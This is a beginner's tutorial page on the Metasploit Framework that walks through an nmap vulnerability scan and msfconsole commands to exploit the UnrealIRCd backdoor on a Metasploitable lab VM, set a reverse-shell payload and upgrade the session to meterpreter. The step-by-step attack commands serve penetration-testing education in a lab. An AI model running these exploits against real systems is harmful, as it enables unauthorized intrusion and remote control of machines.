---
title: Metasploit Framework 🔐
description: Learn about Metasploit, its purpose, and how to use it responsibly.
layout: ../../layouts/MainLayout.astro
---

## Setup Before We Begin 🛠

Before diving into the Metasploit Framework, make sure you've set up your [Metasploitable VM](page-metasploitable).

## What is Metasploit Framework? 🌐

The Metasploit Framework, maintained by Rapid7, is a vital computer security project that helps with security vulnerability information, penetration testing, and the creation of IDS signatures. It encompasses a set of powerful tools, including the iconic "msfconsole," designed to access various networks and computer systems.

## The Versatility of Metasploit 🧐

Metasploit is a versatile tool, serving both ethical hackers and cybercriminals. Its open-source nature allows adaptation to various operating systems. For this guide, we focus on ethical hacking, and we are not responsible for any other use.

## Understanding msfconsole 🔮

"msfconsole" is the primary interface for the Metasploit Framework, serving as a centralized console that grants access to numerous Metasploit options. It allows you to scan, exploit, and more.

Here's an example of exploiting a Metasploitable VM that you can download from [here](https://information.rapid7.com/download-metasploitable-2017-thanks.html). In this example, we're targeting port 6667 (IRC), but you can use Nmap for broader port and vulnerability scanning.

### Example Nmap scan for more ports and vulnerabilities:

```markdown
sudo nmap -sV -sT --script=vuln ip_of_vm
```

## Installing Metasploit Framework 💻

The Metasploit Framework should already be installed on the [Virtual Machine](page-3) we previously set up. If it's not, you'll need to install it yourself.

## Running msfconsole 💡

To launch the "msfconsole" tool, follow these steps:

1. Open your terminal.
2. Type the following command:
```markdown
msfconsole
```

You'll see this result:

```markdown
msf6 >
```

## Getting Started with Metasploit 💪

With Metasploit, you can select exploits, scanners, and more using the "use" command. For instance:

```markdown
msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
```

Once you've chosen an exploit, you'll need to set a payload using the "set" command. Here's an example:

```markdown
msf6 > set PAYLOAD cmd/unix/reverse
```

This sets the payload as "cmd/unix/reverse," which opens a backdoor for command line access.

After selecting an exploit and payload, you'll need to configure other settings. You can view the required options using the "show options" command:

```markdown
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show options
```

You'll see details that need to be specified, like LHOST (your local host) and RHOST (the target's IP). You can set them using the "set" command. For instance:

```markdown
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOST xx.xx.xx.xx
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.0.xx
```

With the configuration complete, you're ready to exploit the target using the "exploit" command.

## Upgrading a Metasploit Session 🔝

For more advanced users, you can upgrade a session. If you've already exploited a server using an IRC backdoor exploit, you can enhance your capabilities by:

1. Pressing "Ctrl + Z" to return to the msfconsole.
2. Typing "sessions" to view active sessions.
3. Finding the session number.
4. Upgrading it using "session -u session_num."

Now, you can access more commands and options within a meterpreter session by typing "help."

Stay responsible and always adhere to ethical hacking practices. 🛡